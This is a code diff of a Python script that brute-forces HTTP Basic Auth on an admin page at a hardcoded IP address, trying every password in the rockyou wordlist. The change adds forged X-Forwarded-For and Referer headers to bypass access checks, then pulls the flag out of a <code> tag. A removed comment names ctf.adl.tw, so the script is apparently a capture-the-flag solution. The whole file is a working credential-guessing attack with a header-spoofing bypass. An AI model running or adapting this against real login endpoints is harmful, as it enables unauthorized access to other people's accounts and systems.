@@ -1,24 +1,14 @@
 from base64 import b64encode
-import time
 import requests
+from bs4 import BeautifulSoup
 from requests.exceptions import ReadTimeout, ConnectTimeout
-from fake_useragent import UserAgent
 
 login_url = 'http://140.115.59.7:12002/admin'
-
-ua = UserAgent()
-
 login_headers = {
     "Host": "140.115.59.7:12002",
-    "Cache-Control": "max-age=0",
+    "Referer": "https://www.adlSecurity.com", # Step 3
+    "X-Forwarded-For": "127.0.0.1",  # Step 2
     "Authorization": None,
-    "Upgrade-Insecure-Requests": "1",
-    "User-Agent": ua.random,
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Referer": "http://140.115.59.7:12002/",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
-    "Connection": "close"
 }
 
 
@@ -46,15 +36,15 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
                 print("read timeout, retry")
             except ConnectTimeout:
                 print("connect timeout, retry")
-        if 'You have not been verified' not in response.text:
+        
+        if response.status_code == 200:
+        # if 'You have not been verified' not in response.text:
             print(f"found password!: {line}")
             with open('output.txt', 'w') as output_file:
                 output_file.write(f"found password!: {line}\n")  # Write to file
+            soup = BeautifulSoup(response.text, 'html.parser')
+            tag_content = soup.find('code').text.strip()
+            print("Content within <code> tags:")
+            print(tag_content)
             break
         # time.sleep(0.5)
-
-
-
-# headers['Authorization'] = basic_auth('bocchi', 'bocchio')
-# response = requests.get(url='http://ctf.adl.tw:12002/admin', headers=headers)
-# print(response.text)
